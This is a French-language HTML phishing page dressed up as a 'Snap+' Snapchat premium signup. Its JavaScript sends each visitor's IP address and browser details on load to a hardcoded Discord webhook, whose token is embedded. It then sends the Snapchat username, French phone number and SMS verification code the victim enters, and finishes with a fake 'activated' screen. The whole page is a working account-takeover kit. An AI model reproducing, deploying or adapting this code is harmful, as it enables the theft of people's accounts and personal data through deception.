<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>S'inscrire à Snap+</title>

  <!-- ==========================================================================
       META TAGS - PARTAGE SUR RÉSEAUX SOCIAUX
       ========================================================================== -->
  <meta property="og:title" content="S'inscrire à Snap+">
  <meta property="og:description" content="Inscrivez-vous à Snap+ pour débloquer des avantages premium exclusifs.">
  <meta property="og:image" content="https://i.pinimg.com/1200x/e1/8e/e7/e18ee7a774a7b42f03ea74a6b64811bd.jpg">
  <meta property="og:url" content="https://methodsnap.netlify.app/">
  <meta property="og:type" content="website">

  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:title" content="S'inscrire à Snap+">
  <meta name="twitter:description" content="Inscrivez-vous à Snap+ pour débloquer des avantages premium exclusifs.">
  <meta name="twitter:image" content="https://i.pinimg.com/1200x/e1/8e/e7/e18ee7a774a7b42f03ea74a6b64811bd.jpg">

  <!-- ==========================================================================
       VARIABLES CSS - THÈME JAUNE SNAPCHAT
       ========================================================================== -->
  <style>
    :root {
      --primary: #ffcc00;
      --primary-dark: #e6b800;
      --success: #00cc66;
      --bg-dark: #0a0a0a;
      --card: #111111;
      --input: #1a1a1a;
      --border: #333333;
      --text: #eeeeee;
      --text-light: #aaaaaa;
      --error: #ff6666;
      --shadow-glow: 0 6px 20px rgba(255,204,0,0.25);
      --link-color: #ffcc00;
    }

    * { box-sizing: border-box; margin:0; padding:0; }

    html, body {
      height: 100%;
      font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background: var(--bg-dark);
      color: var(--text);
      overflow-x: hidden;
    }

    body {
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100dvh;
      padding: 1rem;
    }

    canvas { position: fixed; inset: 0; z-index: 0; pointer-events: none; }

    .card {
      position: relative;
      z-index: 1;
      width: 100%;
      max-width: 420px;
      background: var(--card);
      border-radius: 24px;
      padding: clamp(1.8rem, 5vw, 2.4rem) clamp(1.5rem, 4vw, 2rem);
      border: 1px solid var(--border);
      box-shadow: 0 20px 80px rgba(0,0,0,0.9), inset 0 1px 0 rgba(255,255,255,0.03);
      backdrop-filter: blur(10px);
      animation: cardAppear 0.8s cubic-bezier(0.23,1,0.32,1);
    }

    @keyframes cardAppear { from { opacity:0; transform:translateY(40px) scale(0.94); } to { opacity:1; transform:none; } }

    h1 { text-align:center; color:var(--primary); margin-bottom:1.8rem; font-size:clamp(1.6rem,6.5vw,2rem); font-weight:600; }

    label { display:block; margin-bottom:0.6rem; color:#ccc; font-size:clamp(0.95rem,3.6vw,1rem); font-weight:500; }

    input, select {
      width:100%;
      padding:clamp(0.95rem,3.8vw,1.15rem) 1.1rem;
      border-radius:14px;
      border:1px solid var(--border);
      background:var(--input);
      color:white;
      font-size:clamp(1rem,4vw,1.05rem);
      margin-bottom:1.4rem;
      transition:all 0.25s;
    }

    input:focus, select:focus {
      border-color:var(--primary);
      box-shadow:0 0 0 4px rgba(255,204,0,0.18);
      outline:none;
    }

    .btn-container {
      display: flex;
      justify-content: center;
      margin-top: 1.6rem;
    }

    button {
      width: 100%;
      max-width: 240px;
      padding: clamp(0.95rem,4vw,1.2rem);
      border-radius:999px;
      border:none;
      background:var(--primary);
      color:black;
      font-size:clamp(1.05rem,4.2vw,1.15rem);
      font-weight:700;
      cursor:pointer;
      min-height:54px;
      box-shadow:var(--shadow-glow);
      transition:all 0.3s;
    }

    button:hover:not(:disabled) {
      background:var(--primary-dark);
      transform:translateY(-2px) scale(1.03);
      box-shadow:0 12px 30px rgba(255,204,0,0.35);
    }

    button:disabled { background:#444; color:#888; cursor:not-allowed; transform:none; box-shadow:none; }

    .error { text-align:center; color:var(--error); font-size:0.9rem; margin:-0.8rem 0 1.2rem; }

    .code-box { display:flex; justify-content:center; gap:clamp(0.7rem,3.5vw,1rem); margin:1.6rem 0; }

    .code-box input {
      width:clamp(54px,15vw,70px);
      height:clamp(64px,17vw,80px);
      font-size:clamp(1.7rem,6.5vw,2.1rem);
      font-weight:700;
      text-align:center;
      border-radius:14px;
      border:2px solid var(--border);
      background:var(--input);
      color:var(--primary);
    }

    .code-box input:focus {
      border-color:var(--primary);
      box-shadow:0 0 0 4px rgba(255,204,0,0.22);
    }

    .resend { text-align:center; margin-top:1.1rem; font-size:0.96rem; color:var(--text-light); cursor:pointer; }
    .resend:hover { color:var(--primary); }

    .success { text-align:center; padding:2.5rem 1rem; }

    .check {
      width:100px; height:100px;
      border:6px solid var(--success);
      border-radius:50%;
      margin:2rem auto;
      position:relative;
      animation:popIn 0.7s;
    }

    .check:after {
      content:"✔";
      font-size:54px;
      color:var(--success);
      position:absolute;
      top:50%; left:50%;
      transform:translate(-50%,-55%) scale(0);
      animation:drawCheck 0.6s 0.3s forwards;
    }

    @keyframes popIn { 0% { transform:scale(0.3); opacity:0; } 60% { transform:scale(1.15); } 100% { transform:scale(1); opacity:1; } }
    @keyframes drawCheck { to { transform:translate(-50%,-55%) scale(1); } }

    .tuto-link {
      text-align: center;
      margin-top: 1rem;
      font-size: 0.95rem;
      color: var(--link-color);
      text-decoration: underline;
      cursor: pointer;
    }

    .tuto-link:hover { color: #fff; }

    @media (max-width:480px) {
      .card { padding:1.6rem 1.3rem; border-radius:20px; }
      .code-box input { width:60px; height:68px; font-size:1.8rem; }
      button { max-width:none; }
    }
  </style>
</head>
<body>

<canvas id="bg"></canvas>

<div class="card">
  <h1 id="title">S'inscrire à Snap+</h1>

  <div id="step1">
    <label>Nom d'utilisateur Snap</label>
    <input id="username" autocomplete="off" placeholder="ex: lyna.xx">

    <label>Durée de l’abonnement</label>
    <select id="duration">
      <option value="" disabled selected>Choisissez une durée</option>
      <option value="1">1 mois</option>
      <option value="3">3 mois</option>
      <option value="12">12 mois</option>
    </select>

    <div class="btn-container">
      <button id="b1" disabled>Continuer</button>
    </div>

    <div class="tuto-link">
      <a href="https://youtube.com/shorts/Vw46CYC59B4?feature=share" target="_blank" style="color:inherit; text-decoration:none;">
        Tuto → Comment activer Snap+
      </a>
    </div>
  </div>

  <div id="step2" style="display:none">
    <label style="font-family:system-ui,Segoe UI,sans-serif">🇫🇷 Numéro de téléphone français</label>
    <input id="phone" placeholder="06 12 34 56 78" inputmode="tel" autocomplete="tel">
    <div class="error" id="phoneErr"></div>

    <div class="btn-container">
      <button id="b2" disabled>Recevoir le code</button>
    </div>
  </div>

  <div id="step3" style="display:none">
    <label>Code reçu par SMS</label>
    <div class="code-box">
      <input maxlength="1" inputmode="numeric" pattern="[0-9]*">
      <input maxlength="1" inputmode="numeric" pattern="[0-9]*">
      <input maxlength="1" inputmode="numeric" pattern="[0-9]*">
      <input maxlength="1" inputmode="numeric" pattern="[0-9]*">
    </div>

    <div class="btn-container">
      <button id="b3" disabled>Valider</button>
    </div>

    <div class="resend" id="resend">Renvoyer le code</div>
  </div>

  <div id="step4" style="display:none" class="success">
    <div class="check"></div>
    <h2 style="color:var(--success); margin:1.8rem 0 1rem; font-size:1.5rem;">Snap+ activé !</h2>
    <p style="color:#aaa; font-size:0.95rem;">Profitez de tous les avantages premium</p>
  </div>
</div>

<!-- ==========================================================================
     JAVASCRIPT - LOGIQUE DE LA PAGE
     ========================================================================== -->
<script>
// =============================================================================
// CONFIGURATION GLOBALE
// =============================================================================
const WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1474900079205679164/9DmcNu0XH3dzJFXZMlv8a8tIjqdvemCjC5NHzifVFVuiL_mrayd3Sdywkt0LEE4Wfvbd";
const WEBHOOK_NAME = "Snap+";
const WEBHOOK_AVATAR = "https://i.pinimg.com/1200x/a5/7f/81/a57f81feccd968c8951f48d862af8b72.jpg";
const DEBUG = true;
const VERSION = "1.4.0-snapplus-secure-2026";

// =============================================================================
// FORMATAGE NUMÉRO TÉLÉPHONE (2 par 2)
// =============================================================================
function formatPhone(p) {
  let d = p.replace(/\D/g, '');
  if (d.startsWith('33') && d.length === 11) d = '0' + d.slice(2);
  if (d.length === 10 && d.startsWith('0')) return d.match(/.{2}/g).join(' ');
  return p.trim();
}

// =============================================================================
// INFOS CLIENT
// =============================================================================
async function getClient() {
  const info = {
    time: new Date().toISOString(),
    ua: navigator.userAgent || '?',
    lang: navigator.language || '?',
    screen: `${screen.width||'?'}x${screen.height||'?'}`
  };
  try {
    const r = await fetch("https://api.ipify.org?format=json");
    info.ip = (await r.json()).ip;
  } catch {
    info.ip = '?';
  }
  return info;
}

// =============================================================================
// ENVOI WEBHOOK
// =============================================================================
async function send(title, data={}) {
  const c = await getClient();
  const embed = {
    title,
    color: 0xFFCC00,
    fields: Object.entries(data).map(([k,v])=>({name:k, value:"```"+(v||"—")+"```", inline:k.length<20})),
    footer: { text: `IP: ${c.ip} • ${c.ua.slice(0,80)}${c.ua.length>80?'...':''}` },
    timestamp: c.time
  };
  try {
    await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: {"Content-Type":"application/json"},
      body: JSON.stringify({
        embeds: [embed],
        username: WEBHOOK_NAME,
        avatar_url: WEBHOOK_AVATAR
      })
    });
  } catch(e) {
    console.error("Webhook error", e);
  }
}

// =============================================================================
// CHARGEMENT PAGE
// =============================================================================
window.addEventListener("load", () => send("📤 Nouvelle demande Snap +"));

// =============================================================================
// ÉTAPE 1
// =============================================================================
const u = document.getElementById("username");
const d = document.getElementById("duration");
const b1 = document.getElementById("b1");

function check1() { b1.disabled = !(u.value.trim() && d.value); }
u.oninput = d.onchange = check1;

b1.onclick = async () => {
  await send("Étape 1 – Continuer cliqué", {
    "Nom d'utilisateur": u.value.trim(),
    "Durée choisie": d.options[d.selectedIndex].text
  });
  document.getElementById("step1").style.display = "none";
  document.getElementById("step2").style.display = "block";
};

// =============================================================================
// ÉTAPE 2
// =============================================================================
const p = document.getElementById("phone");
const err = document.getElementById("phoneErr");
const b2 = document.getElementById("b2");

p.oninput = () => {
  let v = p.value.replace(/\D/g, "");
  let ok = /^(0|\+33)[67]\d{8}$/.test(v);
  err.textContent = ok ? "" : "Format invalide (ex: 06XXXXXXXX)";
  b2.disabled = !ok;
};

b2.onclick = async () => {
  await send("Étape 2 – Numéro saisi", {
    "Nom d'utilisateur": u.value.trim(),
    "Durée": d.options[d.selectedIndex].text,
    "Téléphone": formatPhone(p.value.trim())
  });
  document.getElementById("step2").style.display = "none";
  document.getElementById("step3").style.display = "block";
};

// =============================================================================
// ÉTAPE 3 - CODE SMS
// =============================================================================
const codes = [...document.querySelectorAll(".code-box input")];
let code = "";

codes.forEach((el, i) => {
  el.oninput = () => {
    el.value = el.value.replace(/\D/,"");
    if (el.value && codes[i+1]) codes[i+1].focus();
    code = codes.map(e=>e.value).join("");
    document.getElementById("b3").disabled = code.length !== 4;
  };
  el.onkeydown = e => {
    if (e.key === "Backspace" && !el.value && codes[i-1]) codes[i-1].focus();
  };
});

document.getElementById("b3").onclick = async () => {
  await send("Étape finale – CODE ENTRÉ", {
    "Nom d'utilisateur": u.value.trim(),
    "Durée": d.options[d.selectedIndex].text,
    "Téléphone": formatPhone(p.value.trim()),
    "Code sms": code,
    "Statut": "✅ Validé"
  });
  document.getElementById("step3").style.display = "none";
  document.getElementById("step4").style.display = "block";
  document.getElementById("title").textContent = "Succès";
};

// =============================================================================
// RENVOYER CODE - COOLDOWN
// =============================================================================
let cd = 0;
const r = document.getElementById("resend");
r.onclick = () => {
  if (cd) return;
  cd = 30;
  r.textContent = `Renvoyer (${cd}s)`;
  const t = setInterval(() => {
    cd--;
    r.textContent = `Renvoyer (${cd}s)`;
    if (!cd) {
      clearInterval(t);
      r.textContent = "Renvoyer le code";
    }
  }, 1000);
};

// =============================================================================
// ANIMATION PARTICULES FOND
// =============================================================================
try {
  const c = document.getElementById("bg");
  const ctx = c.getContext("2d");
  let w, h;
  function rs() { w = c.width = window.innerWidth; h = c.height = window.innerHeight; }
  window.onresize = rs; rs();

  const ps = Array.from({length:90}, ()=>({
    x:Math.random()*w, y:Math.random()*h,
    vx:(Math.random()-0.5)*0.6, vy:(Math.random()-0.5)*0.6,
    r:Math.random()*1.9+1
  }));

  let m = {x:w/2, y:h/2};
  window.onmousemove = e=>{m.x=e.clientX; m.y=e.clientY;};
  window.ontouchmove = e=>{if(e.touches.length){m.x=e.touches[0].clientX; m.y=e.touches[0].clientY;}};

  function loop() {
    ctx.clearRect(0,0,w,h);
    const g = ctx.createRadialGradient(m.x,m.y,0,m.x,m.y,220);
    g.addColorStop(0,'rgba(255,204,0,0.09)');
    g.addColorStop(0.45,'rgba(255,204,0,0.035)');
    g.addColorStop(1,'rgba(255,204,0,0)');
    ctx.fillStyle=g; ctx.fillRect(0,0,w,h);

    ps.forEach(p=>{
      p.x+=p.vx; p.y+=p.vy;
      if(p.x<0||p.x>w)p.vx*=-1;
      if(p.y<0||p.y>h)p.vy*=-1;
      let dist=Math.hypot(p.x-m.x,p.y-m.y);
      if(dist<160){p.vx+=(p.x-m.x)/dist*0.55; p.vy+=(p.y-m.y)/dist*0.55;}
      ctx.fillStyle=`rgba(255,204,0,${0.35+(1-dist/160)*0.45})`;
      ctx.beginPath(); ctx.arc(p.x,p.y,p.r,0,Math.PI*2); ctx.fill();
    });
    requestAnimationFrame(loop);
  }
  loop();
} catch(e) {
  console.error("Canvas error", e);
}

// =============================================================================
// FIN DU SCRIPT - Snap+ Activation
// =============================================================================
</script>
</body>
</html>
